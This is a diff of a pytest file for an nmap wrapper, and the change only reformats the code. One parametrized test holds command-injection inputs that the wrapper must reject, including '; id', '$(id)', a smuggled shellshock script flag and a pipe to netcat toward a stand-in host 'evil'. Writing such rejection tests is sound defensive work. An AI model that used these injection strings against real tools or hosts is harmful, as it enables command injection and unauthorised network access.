@@ -59,7 +59,14 @@ def test_flags_cannot_be_smuggled_through_the_profile_field(profile: str) -> Non
 
 @pytest.mark.parametrize(
     "target",
-    ["10.0.4.0/24 --script=http-shellshock", "; id", "$(id)", "`id`", "10.0.4.0/24|nc evil 1", "-oN"],
+    [
+        "10.0.4.0/24 --script=http-shellshock",
+        "; id",
+        "$(id)",
+        "`id`",
+        "10.0.4.0/24|nc evil 1",
+        "-oN",
+    ],
 )
 def test_shell_metacharacters_in_a_target_are_rejected_at_argv_construction(target: str) -> None:
     with pytest.raises(InvalidNetworkError):
@@ -102,7 +109,9 @@ async def test_a_killed_process_leaves_no_child_behind(tmp_path: Path) -> None:
 
 
 async def test_a_nonzero_exit_reports_stderr(tmp_path: Path) -> None:
-    script = _fake_nmap(tmp_path, "echo 'you requested a scan type which requires root' >&2; exit 1")
+    script = _fake_nmap(
+        tmp_path, "echo 'you requested a scan type which requires root' >&2; exit 1"
+    )
     runner = NmapRunner(nmap_path=script, timeout_seconds=5)
 
     with pytest.raises(NmapFailedError, match="requires root"):
